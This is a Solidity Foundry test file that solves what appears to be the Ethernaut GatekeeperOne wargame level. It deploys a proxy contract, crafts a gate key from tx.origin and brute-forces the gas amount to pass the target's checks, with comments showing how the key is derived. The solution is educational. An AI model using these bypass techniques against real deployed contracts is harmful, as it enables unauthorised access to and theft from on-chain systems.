// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../GatekeeperOne.sol";

contract ProxyGatekeeperOne {
    GatekeeperOne obj;
    
    constructor(address addr) public {
        obj = GatekeeperOne(addr);
    }
    function enter(bytes8 val) public returns (bool) {
        (bool success,) = address(obj).call(abi.encodeWithSignature("enter(bytes8)", val));
        return success;
    }

    function hack() public returns (bool) {
        console.log("senders = ", msg.sender);
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0x0000000f0000ffff;
        bool success;
        for(uint i;i < 9000;i++) {
            success = this.enter{gas: 8191 * 3 + i}(key);
            if(success) {
                console.log("i =", i);
                break;
            }
        }
        return success;
    }
}
contract GatekeeperOneTest is DSTest {
    GatekeeperOne obj;
    ProxyGatekeeperOne proxy_gatekeeperone;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {
        contract_address = 0xE77871361755C3975EA656cf837b32103e3A37Db;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = GatekeeperOne(contract_address);
        proxy_gatekeeperone = new ProxyGatekeeperOne(contract_address);
        // obj = new GatekeeperOne();
        // proxy_gatekeeperone = new ProxyGatekeeperOne(address(obj));
    }

    function testGatekeeperOne() public {
        /*
        tx.origin = 0x00a329c0648769a73afac7f9381e08fb43dbea72

        uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) ==>
        uint16(tx.origin) = 0xea72
        uint32(uint64(_gateKey)) = 0x0000ea72
                
        uint32(uint64(_gateKey)) != uint64(_gateKey) ==>
        uint32(uint64(_gateKey)) = 0x0000ea72
        uint64(_gateKey) = 0x000000010000ea72

        uint32(uint64(_gateKey)) == uint16(tx.origin) ==>
        uint32(uint64(_gateKey)) = 0x0000ea72
        uint16(uint64(_gateKey)) = 0xea72
        */
        console.log("Proxy GatekeeperOne Address =", address(proxy_gatekeeperone));
        // console.log("initial entrant state =", obj.entrant()); 
        console.log("tx.origin =", tx.origin); 
        bool success = proxy_gatekeeperone.hack();
        // console.log("end entrant state =",obj.entrant()); 
        assert(success == true); 
    }
}
